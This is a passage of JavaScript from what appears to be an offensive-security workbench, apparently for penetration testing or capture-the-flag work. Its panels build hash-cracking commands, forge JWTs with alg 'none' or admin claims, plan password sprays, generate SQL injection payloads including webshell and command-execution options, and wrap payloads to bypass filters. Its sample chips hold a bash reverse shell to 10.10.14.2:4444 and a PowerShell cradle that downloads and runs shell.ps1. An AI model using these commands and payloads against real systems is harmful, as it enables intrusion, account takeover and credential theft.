    { label: 'AS-REP ($krb5asrep$)',    val: '$krb5asrep$23$bob@ACME.INTERNAL:a1b2c3d4e5f60718293a4b5c6d7e8f90$0102030405060708090a0b0c0d0e0f10' },
    { label: 'NetNTLMv2 (Responder)',   val: 'bob::ACME:1122334455667788:a1b2c3d4e5f60718293a4b5c6d7e8f90:010100000000000000112233445566778899aabbccddeeff' },
    { label: 'Linux /etc/shadow ($6$)', val: 'bob:$6$rounds=5000$saltsalt$abcDEF0123456789./abcDEF0123456789./abcDEF0123456789.:19400:0:99999:7:::' },
    { label: 'bcrypt ($2b$)',           val: '$2b$12$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ01234' },
  ];

  function renderHashResults(raw) {
    var nz = W.normalizeHash(raw);
    var r = W.identifyHash(nz.cleaned);
    var cleanBlock = '';
    if (nz.changed && nz.cleaned) {
      cleanBlock = '<div class="wb-clean">'
        + '<div class="wb-clean-h">Auto-Cleaned Hash for Cracking' + (nz.username ? (' (Account: ' + esc(nz.username) + ')') : '') + '</div>'
        + '<ul class="wb-clean-list">' + nz.changes.map(function (c) { return '<li>' + esc(c) + '</li>'; }).join('') + '</ul>'
        + cmdRow(nz.cleaned, 'wb-hash-cleaned', '', { locus: 'hash' })
        + '</div>';
    }
    if (!r.input) {
      return '<p class="wb-note">Paste a hash above (or click a sample chip) to identify its Hashcat mode, John format, and ready-to-run crack pipeline.</p>';
    }
    if (!r.candidates.length) {
      return cleanBlock + '<div class="wb-hash-out"><p class="wb-note">' + esc(r.note || 'No match.') + '</p></div>';
    }
    return cleanBlock + '<div class="wb-hash-out">'
      + r.candidates.map(function (c, i) {
          var badge = i === 0 && r.candidates.length > 1 ? '<span class="wb-likely">Most Likely</span>' : '';
          var mode = c.mode != null ? '<span class="wb-mode">hashcat -m ' + c.mode + '</span>' : '<span class="wb-mode wb-mode-none">no hashcat mode</span>';
          var john = c.john ? '<span class="wb-john">john --format=' + esc(c.john) + '</span>' : '';
          var pipe = W.crackPipelineCmds ? W.crackPipelineCmds(c, nz.cleaned, { username: nz.username }) : [];
          return '<div class="wb-hash-card' + (i === 0 ? ' top' : '') + '">'
            + '<div class="wb-hash-head">' + badge + '<span class="wb-hash-name">' + esc(c.name) + '</span>' + mode + john + '</div>'
            + '<p class="wb-hash-note">' + esc(c.note) + '</p>'
            + '<div class="wb-step-list">'
            + pipe.map(function (step) {
                return '<div class="wb-step-item"><div class="wb-xform-note">' + esc(step.label) + '</div>' + cmdRow(step.cmd, '', '', { locus: step.locus }) + '</div>';
              }).join('')
            + '</div></div>';
        }).join('')
      + '</div>';
  }

  function hashidPanel() {
    return '<div class="wb-panel wb-panel-amber">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('key') : '') + 'Hash Identifier, Auto-Cleaner &amp; *2john Extractors</h2>'
      + '<p class="wb-panel-sub">Paste any raw hash, secretsdump line, <code>/etc/shadow</code> entry, or multi-line Rubeus ticket. OBOL strips prefixes/line-wraps and builds the exact Hashcat &amp; John commands.</p>'
      + '</div></div>'
      + '<div class="wb-field-l" style="margin-top:0">Try a Sample Hash</div>'
      + '<div class="wb-fill-chips">'
      + HASH_SAMPLES.map(function (s) {
          return '<button type="button" class="wb-fill-chip" data-wb-sample="' + esc(s.val) + '">' + esc(s.label) + '</button>';
        }).join('')
      + '</div>'
      + '<label class="wb-field-l" for="wb-hash-in">Paste Raw Hash or Dump Line</label>'
      + '<textarea id="wb-hash-in" class="wb-textarea" rows="3" placeholder="Paste an NTLM hash, secretsdump line, /etc/shadow line, or $krb5tgs$ / $krb5asrep$ ticket..." spellcheck="false">' + esc(state.hashInput) + '</textarea>'
      + '<div id="wb-hash-results">' + renderHashResults(state.hashInput) + '</div>'
      + '<details class="wb-extractor-drawer" style="margin-top:18px" open>'
      + '<summary class="wb-extractor-sum">Protected File Hash Extractors (*2john Cheat Sheet for SSH Keys, ZIP, RAR, KeePass, Office, PFX)</summary>'
      + '<div class="wb-extractor-grid">'
      + (W.JOHN_EXTRACTORS || []).map(function (ex) {
          return '<div class="wb-step-card wb-card-amber">'
            + '<div class="wb-step-card-h"><span class="wb-mode">hashcat -m ' + ex.mode + '</span><strong>' + esc(ex.label) + '</strong></div>'
            + '<p class="wb-hash-note">' + esc(ex.note) + '</p>'
            + '<div class="wb-xform-note">1. Extract hash from file:</div>'
            + cmdRow(ex.extractCmd, '', '', { locus: 'kali$' })
            + '<div class="wb-xform-note" style="margin-top:6px">2. Crack extracted hash:</div>'
            + cmdRow('john --wordlist=/usr/share/wordlists/rockyou.txt ' + ex.extractCmd.split('>')[1].trim(), '', '', { locus: 'kali$' })
            + '</div>';
        }).join('')
      + '</div></details>'
      + refsStrip([
        { label: 'Hashcat Example Hashes', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
        { label: 'CrackStation Lookup', url: 'https://crackstation.net/' },
      ])
      + '</div>';
  }

  // ── 5. Interactive JWT Tamper & Forgery Studio ──────────────────────────────────────────────
  var JWT_SAMPLE = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IiLCJyb2xlIjoidXNlciIsImlhdCI6MTcxMDAwMDAwMH0.dummysignature';

  function syncJwtEditorFromToken(tok) {
    var d = W.decodeJwt(tok);
    if (d.ok) {
      state.jwtHeaderText = JSON.stringify(d.header, null, 2);
      state.jwtPayloadText = JSON.stringify(d.payload, null, 2);
      recomputeForgedJwt();
    }
  }

  function recomputeForgedJwt() {
    try {
      var h = JSON.parse(state.jwtHeaderText || '{"alg":"HS256","typ":"JWT"}');
      var p = JSON.parse(state.jwtPayloadText || '{}');
      if (state.jwtForgeMode === 'none') {
        state.jwtForged = W.forgeJwtNone(h, p, h.alg && /^none$/i.test(h.alg) ? h.alg : 'none');
      } else {
        state.jwtForged = W.signJwtHs256(h, p, state.jwtSecret);
      }
    } catch (e) {
      state.jwtForged = '';
    }
  }

  function renderJwtStudio() {
    var raw = state.jwtInput;
    if (!raw || !raw.trim()) {
      return '<p class="wb-note">Paste a JWT above (or click the sample chip) to inspect its claims, forge an <code>alg: "none"</code> token, or edit claims and re-sign with an HMAC secret.</p>';
    }
    var r = W.decodeJwt(raw);
    if (!r.ok) {
      return '<div class="wb-jwt-out"><p class="wb-note">' + esc(r.error) + '</p></div>';
    }
    if (!state.jwtHeaderText || !state.jwtPayloadText) {
      state.jwtHeaderText = JSON.stringify(r.header, null, 2);
      state.jwtPayloadText = JSON.stringify(r.payload, null, 2);
      recomputeForgedJwt();
    }
    var p = engParams();
    var attacks = W.jwtAttackCmds ? W.jwtAttackCmds(raw) : [];
    return '<div class="wb-jwt-studio">'
      + (r.flags.length
          ? '<div class="wb-clean" style="margin-bottom:14px"><div class="wb-clean-h">Security Observations on Pasted Token</div><ul class="wb-clean-list">'
            + r.flags.map(function (f) { return '<li>' + esc(f) + '</li>'; }).join('') + '</ul></div>'
          : '')
      + '<div class="wb-field-l" style="margin-top:0">1. One-Click Token Tamper Presets</div>'
      + '<div class="wb-fill-chips">'
      + '<button type="button" class="wb-fill-chip" data-wb-jwtact="elevate">Elevate Claims (role: "admin", sub: "admin")</button>'
      + '<button type="button" class="wb-fill-chip" data-wb-jwtact="none">Forge alg: "none" (Strip Signature)</button>'
      + '<button type="button" class="wb-fill-chip" data-wb-jwtact="hs256">Re-Sign with HMAC-SHA256 Secret</button>'
      + '</div>'
      + '<div class="wb-paired-grid">'
      + '<div class="wb-step-card wb-card-amber">'
      + '<div class="wb-field-l" style="margin-top:0">Editable Header JSON</div>'
      + '<textarea id="wb-jwt-hdr" class="wb-textarea" rows="4" spellcheck="false">' + esc(state.jwtHeaderText) + '</textarea>'
      + '<div class="wb-field-l">Editable Payload Claims JSON</div>'
      + '<textarea id="wb-jwt-pay" class="wb-textarea" rows="6" spellcheck="false">' + esc(state.jwtPayloadText) + '</textarea>'
      + '<label class="wb-param" style="margin-top:10px;width:100%"><span>HMAC Secret Key (for HS256 Signing)</span>'
      + '<input id="wb-jwt-sec" type="text" value="' + esc(state.jwtSecret) + '" placeholder="secret123" autocomplete="off" spellcheck="false"></label>'
      + '</div>'
      + '<div class="wb-step-card wb-card-emerald">'
      + '<div class="wb-step-card-h"><span class="wb-badge wb-badge-emerald">' + (state.jwtForgeMode === 'none' ? 'UNSIGNED (alg: none)' : 'SIGNED (HS256)') + '</span><strong>Live Forged JWT Token</strong></div>'
      + '<p class="wb-hash-note">Edits to the Header, Payload, or HMAC Secret on the left immediately update this forged token:</p>'
      + '<div id="wb-jwt-forged-box">'
      + (state.jwtForged
          ? cmdRow(state.jwtForged, 'wb-jwt-forged', '', { locus: 'jwt' })
            + '<div class="wb-field-l">Send Forged Token with curl</div>'
            + cmdRow('curl -i -H "Authorization: Bearer ' + state.jwtForged + '" http://' + p.target + '/', 'wb-jwt-curl', '', { locus: 'kali$' })
          : '<p class="wb-note">Fix JSON syntax in Header or Payload to generate token.</p>')
      + '</div>'
      + '<div class="wb-field-l" style="margin-top:14px">Offline Secret Cracking Commands</div>'
      + '<div class="wb-step-list">'
      + attacks.map(function (a) {
          return '<div class="wb-step-item"><div class="wb-xform-note">' + esc(a.label) + '</div>' + cmdRow(a.cmd, '', '', { locus: a.locus }) + '</div>';
        }).join('')
      + '</div></div></div></div>';
  }

  function jwtPanel() {
    return '<div class="wb-panel wb-panel-amber">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('shield') : '') + 'Interactive JWT Decoder, Claim Editor &amp; Forgery Studio</h2>'
      + '<p class="wb-panel-sub">Decode any JWT, modify its claims (<code>role: "admin"</code>), strip the signature with <code>alg: "none"</code>, or re-sign it live in your browser with a cracked HMAC secret.</p>'
      + '</div></div>'
      + '<details class="wb-jwt-explainer" open>'
      + '<summary class="wb-jwt-exp-sum">'
      + '<span class="wb-badge wb-badge-amber">Beginner Guide</span>'
      + '<strong>What is a JWT, how do I spot one, and when do I use this tool?</strong>'
      + '<span class="wb-jwt-exp-hint">Click to toggle</span>'
      + '</summary>'
      + '<div class="wb-jwt-exp-grid">'
      + '<div class="wb-jwt-exp-card">'
      + '<div class="wb-jwt-exp-title">1. What is a JWT? (The "Digital Wristband")</div>'
      + '<p>When you log into a modern web app or API, instead of tracking your session in a server database, the server hands your browser a <strong>JSON Web Token (JWT)</strong> - a signed "digital wristband" stating who you are (for example, <code>{"sub": "bob", "role": "user"}</code>).</p>'
      + '<p>On every click, your browser sends that wristband back. <strong>Crucial takeaway:</strong> the middle section is <em>not encrypted</em> - it is just Base64-encoded JSON that anyone can decode and read.</p>'
      + '</div>'
      + '<div class="wb-jwt-exp-card">'
      + '<div class="wb-jwt-exp-title">2. How Do I Spot One on a Target?</div>'
      + '<p>Look for a long string starting with <code>eyJ...</code> split into <strong>three parts by two dots</strong> (<code>header.payload.signature</code>). Why <code>eyJ</code>? Because every JSON object starts with <code>{"</code>, which Base64-encodes to <code>eyJ</code>.</p>'
      + '<p><strong>Where to look in Burp Suite or DevTools (F12):</strong></p>'
      + '<ul class="wb-clean-list">'
      + '<li><strong>Cookies:</strong> <code>Storage / Application &rarr; Cookies</code> (often named <code>token</code>, <code>jwt</code>, or <code>session</code>)</li>'
      + '<li><strong>HTTP Headers:</strong> <code>Authorization: Bearer eyJ...</code></li>'
      + '<li><strong>Local / Session Storage</strong> or JSON login responses</li>'
      + '</ul>'
      + '</div>'
      + '<div class="wb-jwt-exp-card">'
      + '<div class="wb-jwt-exp-title">3. When &amp; How Do I Attack It Here?</div>'
      + '<ul class="wb-clean-list">'
      + '<li><strong>Always Decode First:</strong> Paste any <code>eyJ...</code> string below to reveal hidden usernames, roles, user IDs, or internal hints.</li>'
      + '<li><strong>Attack 1 - Signature Bypass (<code>alg: "none"</code>):</strong> Click <em>Elevate Claims</em>, then click <em>Forge alg: "none"</em>. If the server is misconfigured, it accepts your unsigned admin token!</li>'
      + '<li><strong>Attack 2 - Crack Weak Secret (<code>HS256</code>):</strong> Run the generated <code>hashcat -m 16500</code> command below to crack the server\'s signing password offline, type it into <em>HMAC Secret Key</em>, and copy your validly signed admin token.</li>'
      + '</ul>'
      + '</div>'
      + '</div>'
      + '</details>'
      + '<div class="wb-fill-chips">'
      + '<button type="button" class="wb-fill-chip" data-wb-jwtsample="' + esc(JWT_SAMPLE) + '">Load Sample HS256 Token (sub: bob, role: user)</button>'
      + '</div>'
      + '<label class="wb-field-l" for="wb-jwt-in">Paste Raw JWT (header.payload.signature)</label>'
      + '<textarea id="wb-jwt-in" class="wb-textarea" rows="3" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." spellcheck="false">' + esc(state.jwtInput) + '</textarea>'
      + '<div id="wb-jwt-out">' + renderJwtStudio() + '</div>'
      + '</div>';
  }

  // ── 6. Lockout-Aware Spray Planner & Command Builder ────────────────────────────────────────
  function renderSprayOut() {
    var p = engParams();
    var plan = W.sprayPlan({
      threshold: state.sprayThreshold,
      windowMin: state.sprayWindow,
      passwords: state.sprayPasswords,
      margin: state.sprayMargin,
    });
    if (!plan.ok) {
      return '<div class="wb-sp-out">'
        + (plan.warnings || []).map(function (w) { return '<p class="wb-note wb-sp-warn">' + esc(w) + '</p>'; }).join('')
        + '</div>';
    }
    var cmds = W.sprayCommands ? W.sprayCommands({
      target: p.target,
      domain: p.domain,
      password: state.sprayCandidate,
      userFile: state.sprayUserFile,
      safePerWindow: plan.noLockout ? 10 : plan.safePerWindow,
      windowMin: plan.windowMin || 30
    }) : [];
    var tiles = '';
    if (plan.noLockout) {
      tiles = '<div class="wb-sp-plan"><div class="wb-sp-head">No Account Lockout Policy (Threshold = 0)</div>'
        + '<p class="wb-note">' + esc(plan.warnings[0]) + '</p></div>';
    } else {
      tiles = '<div class="wb-sp-plan">'
        + '<div class="wb-sp-head">Safe Spray Schedule (Leaves ' + plan.margin + ' Attempt' + (plan.margin === 1 ? '' : 's') + ' Below Lockout)</div>'
        + '<div class="wb-sp-grid">'
        + '<div class="wb-sp-tile"><span class="wb-sp-n">' + plan.safePerWindow + '</span><span class="wb-sp-l">Passwords Per Round</span></div>'
        + '<div class="wb-sp-tile"><span class="wb-sp-n">' + W.fmtDuration(plan.windowMin) + '</span><span class="wb-sp-l">Cool-Down Wait</span></div>'
        + '<div class="wb-sp-tile"><span class="wb-sp-n">' + plan.rounds + '</span><span class="wb-sp-l">Total Rounds</span></div>'
        + '<div class="wb-sp-tile"><span class="wb-sp-n">' + W.fmtDuration(plan.totalMinutes) + '</span><span class="wb-sp-l">Total Campaign Time</span></div>'
        + '</div>'
        + (plan.warnings.length ? plan.warnings.map(function (w) { return '<p class="wb-note wb-sp-warn">' + esc(w) + '</p>'; }).join('') : '')
        + '</div>';
    }
    return '<div class="wb-sp-out">'
      + tiles
      + '<div class="wb-field-l" style="margin-top:16px">Ready-to-Run Spray Commands (Pre-Filled with Target &amp; Domain)</div>'
      + '<div class="wb-step-list">'
      + cmds.map(function (c) {
          return '<div class="wb-step-card wb-card-amber"><div class="wb-xform-l">' + esc(c.label) + '</div>' + cmdRow(c.cmd, '', '', { locus: c.locus }) + '</div>';
        }).join('')
      + '</div></div>';
  }

  function sprayPanel() {
    var p = engParams();
    var syncedPolicy = false;
    if (p.facts && p.facts.values) {
      var pol = p.facts.values('ad.password_policy')[0];
      if (pol && pol.threshold != null) {
        syncedPolicy = true;
      }
    }
    return '<div class="wb-panel wb-panel-amber">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('users') : '') + 'Lockout-Aware Password Spray Planner &amp; Command Builder</h2>'
      + '<p class="wb-panel-sub">Enter the domain lockout threshold and observation window (from <code>nxc smb ' + esc(p.target) + ' --pass-pol</code> or <code>net accounts</code>) to compute your safe spray cadence and generate the exact commands.</p>'
      + (syncedPolicy ? '<span class="wb-badge wb-badge-emerald">AD Password Policy Detected in Engagement</span>' : '')
      + '</div></div>'
      + '<div class="wb-params">'
      + '<label class="wb-param"><span>Lockout Threshold (0 = none)</span>'
      + '<input id="wb-sp-thresh" type="number" min="0" max="999" value="' + esc(state.sprayThreshold) + '"></label>'
      + '<label class="wb-param"><span>Reset Window (Minutes)</span>'
      + '<input id="wb-sp-win" type="number" min="1" max="9999" value="' + esc(state.sprayWindow) + '"></label>'
      + '<label class="wb-param"><span>Safety Margin</span>'
      + '<input id="wb-sp-margin" type="number" min="0" max="20" value="' + esc(state.sprayMargin) + '"></label>'
      + '<label class="wb-param"><span>Candidate Password to Spray</span>'
      + '<input id="wb-sp-pass" type="text" value="' + esc(state.sprayCandidate) + '" placeholder="Autumn2026!"></label>'
      + '<label class="wb-param"><span>User List File</span>'
      + '<input id="wb-sp-users" type="text" value="' + esc(state.sprayUserFile) + '" placeholder="users.txt"></label>'
      + '</div>'
      + '<div id="wb-sp-out">' + renderSprayOut() + '</div>'
      + '</div>';
  }

  // ── 7. Encode, Decode & Scenario Bypass Studio ──────────────────────────────────────────────
  function codecSamplesForMode(mode) {
    if (mode === 'decode') {
      return [
        { label: 'Decode: Stacked Base64 + Hex', val: W.b64(W.hexEnc('flag{layered_secret_decoded}')) },
        { label: 'Decode: PowerShell -enc', val: 'powershell -nop -w hidden -enc ' + W.psEnc('IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.2:8000/shell.ps1")') },
        { label: 'Decode: Wrapped Bash Base64', val: W.linuxB64Runner('bash -i >& /dev/tcp/10.10.14.2/4444 0>&1', 'bash') },
        { label: 'Decode: URL-Encoded SQLi', val: '%27%20UNION%20SELECT%201%2C%40%40version--%20-' },
      ];
    }
    return [
      { label: 'Plaintext: Reverse Shell', val: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' },
      { label: 'Plaintext: Command Injection', val: 'cat /etc/passwd' },
      { label: 'Plaintext: PowerShell Cradle', val: 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.2:8000/shell.ps1")' },
      { label: 'Decode: Stacked Base64 + Hex', val: W.b64(W.hexEnc('flag{layered_secret_decoded}')) },
    ];
  }

  function renderStackBar() {
    if (!state.codecStack || !state.codecStack.length) return '';
    var orig = state.codecStack[0].before;
    var trail = '<span class="wb-stack-step wb-stack-orig" title="' + U.attr(orig) + '">Original Plaintext</span>'
      + state.codecStack.map(function (st, idx) {
          return '<span class="wb-tf-arrow">&rarr;</span><span class="wb-stack-step">' + (idx + 1) + '. ' + esc(st.label) + '</span>';
        }).join('');
    return '<div class="wb-stack-bar">'
      + '<div class="wb-stack-top">'
      + '<div><span class="wb-badge wb-badge-violet">Active Layer Stack (' + state.codecStack.length + ')</span>'
      + '<div class="wb-stack-trail">' + trail + '</div></div>'
      + '<div class="wb-stack-actions">'
      + '<button type="button" class="btn-ghost wb-chain-btn" data-wb-stack="undo">Undo Last Layer</button>'
      + '<button type="button" class="btn-ghost wb-chain-btn" data-wb-stack="reset">Reset to Original</button>'
      + '<button type="button" class="btn-ghost wb-chain-btn" data-wb-stack="verify">Verify in Decoder &rarr;</button>'
      + '</div></div>'
      + '<div class="wb-xform-note" style="margin-top:6px">Original plaintext: <code>' + esc(orig) + '</code></div>'
      + '</div>';
  }

  var _codecSeq = 0;
  function paintCodecOutputs(mount, text) {
    var seq = ++_codecSeq;
    var autoEl = mount.querySelector('#wb-dc-auto');
    var bodyEl = mount.querySelector('#wb-codec-body');
    var stackEl = mount.querySelector('#wb-codec-stack');
    var raw = String(text == null ? '' : text);
    var mode = state.codecMode || 'decode';

    if (stackEl) {
      stackEl.innerHTML = mode === 'encode' ? renderStackBar() : '';
    }

    // 1. Always run Smart Auto-Peel Decoder at the top so any encoded input unwraps immediately
    if (autoEl) {
      if (!raw.trim()) {
        autoEl.innerHTML = '';
      } else {
        W.smartDecode(raw).then(function (smart) {
          if (seq !== _codecSeq) return;
          if (smart.found) {
            var stepsHtml = '';
            if (smart.best.steps && smart.best.steps.length > 1) {
              stepsHtml = '<div class="wb-peel-steps">'
                + '<div class="wb-xform-note" style="margin-bottom:4px">Step-by-Step Layer Breakdown:</div>'
                + smart.best.steps.map(function (st, idx) {
                    return '<div class="wb-peel-step">'
                      + '<span class="wb-badge wb-badge-emerald">Layer ' + (idx + 1) + ': ' + esc(st.codec) + '</span>'
                      + '<code>' + esc(st.text) + '</code>'
                      + '</div>';
                  }).join('')
                + '</div>';
            }
            var wrapBadge = smart.best.unwrapped
              ? '<span class="wb-badge wb-badge-cyan" style="margin-right:6px">Unwrapped ' + esc(smart.best.wrapperLabel) + '</span>'
              : '';
            autoEl.innerHTML = '<div class="wb-dc-best">'
              + '<div class="wb-xform-h">'
              + '<div>' + wrapBadge + '<span class="wb-xform-l">Smart Auto-Peel Result (' + smart.best.chain.map(esc).join(' &rarr; ') + ')</span></div>'
              + '<span class="wb-xform-note">Automatically peeled ' + smart.best.chain.length + ' layer' + (smart.best.chain.length === 1 ? '' : 's') + ' to plaintext</span></div>'
              + cmdRow(smart.best.text, 'wb-dc-best-out', '', { locus: 'decoded' })
              + stepsHtml
              + '</div>';
          } else if (mode === 'decode') {
            autoEl.innerHTML = '<div class="wb-step-card wb-card-slate" style="margin-top:12px">'
              + '<strong>Input Already Looks Like Plaintext (or Single-Layer Only)</strong>'
              + '<p class="wb-hash-note">No multi-layer encoding wrapper was detected above the plaintext threshold. Check the single-layer decoders below, or switch to <strong>2. Standard Encode &amp; Stack</strong> to encode this string.</p>'
              + '</div>';
          } else {
            autoEl.innerHTML = '';
          }
        });
      }
    }

    if (!bodyEl) return;

    // Mode 1: Decode Anything (All Single-Layer Decoders)
    if (mode === 'decode') {
      W.decodeAllOnce(raw).then(function (once) {
        if (seq !== _codecSeq) return;
        if (!once.length) {
          bodyEl.innerHTML = '<p class="wb-note">Paste a Base64, PowerShell <code>-enc</code>, Hex, URL, Gzip, HTML, or Binary string above (or click a sample chip) to see every matching decoder.</p>';
          return;
        }
        bodyEl.innerHTML = '<div class="wb-field-l" style="margin-top:14px">Single-Layer Decoder Results (' + once.length + ' matching codecs)</div>'
          + '<div class="wb-enc-out">'
          + once.map(function (r) {
              var tag = r.applies ? '<span class="wb-dc-tag match">Format Match</span>' : '<span class="wb-dc-tag">' + Math.round(r.printable * 100) + '% printable</span>';
              return '<div class="wb-xform">'
                + '<div class="wb-xform-h"><span class="wb-xform-l">' + esc(r.label) + '</span>' + tag + '</div>'
                + cmdRow(r.text, 'wb-dc-once-' + r.id, '', { locus: 'decoded', chainable: true, chainText: 'Use as Input' })
                + '</div>';
            }).join('')
          + '</div>';
      });
      return;
    }

    // Mode 3: Scenario Bypass Recipes (Time-Saving Wrappers)
    if (mode === 'scenarios') {
      var p = engParams();
      var scenarios = W.CODEC_SCENARIOS || [];
      var activeScen = scenarios.filter(function (s) { return s.id === state.codecScenario; })[0] || scenarios[0];
      var built = W.buildCodecScenario ? W.buildCodecScenario(activeScen.id, raw, p) : { scenario: activeScen, items: [] };
      var showSampleBtn = raw.trim() !== activeScen.sample;

      bodyEl.innerHTML = '<div class="wb-field-l" style="margin-top:14px">Choose Your Roadblock / Target Scenario</div>'
        + '<div class="wb-scenario-grid">'
        + scenarios.map(function (s) {
            var on = s.id === activeScen.id;
            return '<button type="button" class="wb-scenario-card wb-sc-' + (s.color || 'violet') + (on ? ' on' : '') + '" data-wb-codecscen="' + esc(s.id) + '">'
              + '<div class="wb-sc-badge">' + esc(s.badge) + '</div>'
              + '<div class="wb-sc-title">' + esc(s.title) + '</div>'
              + '<div class="wb-sc-sub">' + esc(s.when) + '</div>'
              + '</button>';
          }).join('')
        + '</div>'
        + '<div class="wb-step-card wb-card-violet" style="margin-top:12px">'
        + '<div class="wb-step-card-h"><span class="wb-badge wb-badge-violet">' + esc(activeScen.badge) + '</span><strong>When to Use: ' + esc(activeScen.title) + '</strong></div>'
        + '<p class="wb-hash-note">' + esc(activeScen.when) + '</p>'
        + (showSampleBtn
            ? '<div style="margin-top:8px"><button type="button" class="wb-fill-chip" data-wb-encsample="' + esc(activeScen.sample) + '">Load Recommended Example Input: <code>' + esc(activeScen.sample) + '</code></button></div>'
            : '')
        + '</div>'
        + '<div class="wb-enc-out" style="margin-top:12px">'
        + built.items.map(function (it) {
            return '<div class="wb-xform">'
              + '<div class="wb-xform-h"><span class="wb-xform-l">' + esc(it.label) + '</span>'
              + '<span class="wb-xform-note">' + esc(it.note) + '</span></div>'
              + cmdRow(it.out, 'wb-scen-' + it.id, '', { locus: it.locus || 'payload' })
              + '</div>';
          }).join('')
        + '</div>';
      return;
    }

    // Mode 2: Standard Encode & Layer Stacker (Reversible Codecs)
    W.encodeAll(raw).then(function (list) {
      if (seq !== _codecSeq) return;
      var topRows = [
        { id: 'psenc', label: 'PowerShell UTF-16LE Base64 (-EncodedCommand)', note: 'UTF-16LE bytes then Base64 (reversible by OBOL Auto-Peel).', out: W.psEnc(raw) },
      ];
      var allRows = topRows.concat(list);
      bodyEl.innerHTML = '<div class="wb-field-l" style="margin-top:14px">Standard Reversible Encodings (Click "+ Stack Layer" to Multi-Encode)</div>'
        + '<div class="wb-enc-out">'
        + allRows.map(function (r) {
            return '<div class="wb-xform">'
              + '<div class="wb-xform-h"><span class="wb-xform-l">' + esc(r.label) + '</span>'
              + '<span class="wb-xform-note">' + esc(r.note) + '</span></div>'
              + cmdRow(r.out, 'wb-enc-' + r.id, '', { locus: 'encoded', stackLabel: r.label })
              + '</div>';
          }).join('')
        + '</div>';
    });
  }

  function codecPanel() {
    var mode = state.codecMode || 'decode';
    var samples = codecSamplesForMode(mode);
    var modes = [
      {
        id: 'decode',
        badge: 'DECODER',
        title: '1. Decode Anything (Auto-Peel & All Decoders)',
        sub: 'Paste any Base64, PowerShell -enc, Hex, URL, or multi-layer encoded blob to unwrap every layer to plaintext.',
        color: 'emerald'
      },
      {
        id: 'encode',
        badge: 'ENCODER & STACKER',
        title: '2. Standard Encode & Layer Stacker',
        sub: 'Convert plaintext into Base64, PS -enc, URL, Hex, HTML, or Gzip, and stack multiple reversible layers.',
        color: 'cyan'
      },
      {
        id: 'scenarios',
        badge: 'TIME-SAVING WRAPPERS',
        title: '3. Scenario Bypass Recipes (When Characters Break)',
        sub: 'One-click wrappers for broken Linux RCE chars, Windows PowerShell quoting, blocked spaces/slashes, or SQL/XSS quotes.',
        color: 'violet'
      },
    ];
    return '<div class="wb-panel wb-panel-violet">'
      + '<div class="wb-panel-head"><div>'
      + '<h2 class="wb-panel-title">' + (OBOL.ic ? OBOL.ic('code') : '') + 'Encode, Decode &amp; Scenario Bypass Studio</h2>'
      + '<p class="wb-panel-sub">Choose whether you want to <strong>Decode</strong> an unfamiliar string, <strong>Encode / Stack</strong> clean reversible formats, or apply a <strong>Scenario Bypass Recipe</strong> when characters or filters break your payload.</p>'
      + '</div></div>'
      + '<div class="wb-field-l" style="margin-top:0">1. Choose Your Goal</div>'
      + '<div class="wb-scenario-grid">'
      + modes.map(function (m) {
          var on = m.id === mode;
          return '<button type="button" class="wb-scenario-card wb-sc-' + m.color + (on ? ' on' : '') + '" data-wb-codecmode="' + m.id + '">'
            + '<div class="wb-sc-badge">' + esc(m.badge) + '</div>'
            + '<div class="wb-sc-title">' + esc(m.title) + '</div>'
            + '<div class="wb-sc-sub">' + esc(m.sub) + '</div>'
            + '</button>';
        }).join('')
      + '</div>'
      + '<div class="wb-field-l">2. Try a Sample or Paste Your String Below</div>'
      + '<div class="wb-fill-chips" id="wb-codec-samples">'
      + samples.map(function (s) {
          return '<button type="button" class="wb-fill-chip" data-wb-encsample="' + esc(s.val) + '">' + esc(s.label) + '</button>';
        }).join('')
      + '</div>'
      + '<label class="wb-field-l" for="wb-enc-in">Input Text or Encoded Blob</label>'
      + '<textarea id="wb-enc-in" class="wb-textarea" rows="3" placeholder="Paste an encoded string to unwrap, or type a command/payload to encode..." spellcheck="false">' + esc(state.codecInput) + '</textarea>'
      + '<div id="wb-codec-stack"></div>'
      + '<div id="wb-dc-auto" class="wb-dc-auto"></div>'
      + '<div id="wb-codec-body" class="wb-enc-out"></div>'
      + '</div>';
  }

  // ── 8. Manual SQLi Payload Builder ──────────────────────────────────────────────────────────
  function renderSqliOut() {
    var mode = state.sqliMode || 'union';
    var b = W.sqliBuild({ dbms: state.sqliDbms, ctx: state.sqliCtx, cols: state.sqliCols, vis: state.sqliVis, table: state.sqliTable });
    var extra = W.sqliExtraPayloads ? W.sqliExtraPayloads({ dbms: state.sqliDbms }) : { bypass: [], blind: [], rce: [] };

    if (mode !== 'union') {
      var list = mode === 'bypass' ? extra.bypass : (mode === 'blind' ? extra.blind : extra.rce);
      var title = mode === 'bypass' ? 'Authentication Bypass & Login Probes' : (mode === 'blind' ? 'Error-Based & Blind Extraction Payloads' : 'File Read, Webshell Write & OS Command Execution');
      return '<div class="wb-sqli-out">'
        + '<p class="wb-note">' + esc(b.dbms.note) + '</p>'
        + '<div class="wb-sqli-phase"><div class="wb-field-l">' + esc(title) + ' (' + esc(b.dbms.name) + ')</div>'
        + list.map(function (it) {
            return '<div class="wb-sqli-item"><div class="wb-xform-note">' + esc(it.label) + '</div>'
              + cmdRow(it.payload, '', '', { locus: 'sql>', chainable: true }) + '</div>';
          }).join('')
        + '</div></div>';
    }

    return '<p class="wb-note">' + esc(b.dbms.note) + '</p>'
      + '<div class="wb-sqli-out">'
      + b.phases.map(function (p) {
          return '<div class="wb-sqli-phase">'
            + '<div class="wb-field-l">' + esc(p.title) + '</div>'
            + '<p class="wb-hash-note">' + esc(p.note) + '</p>'
            + p.items.map(function (it) {
                return '<div class="wb-sqli-item"><div class="wb-xform-note">' + esc(it.label) + '</div>'
                  + cmdRow(it.payload, '', '', { locus: 'sql>', chainable: true }) + '</div>';
              }).join('')
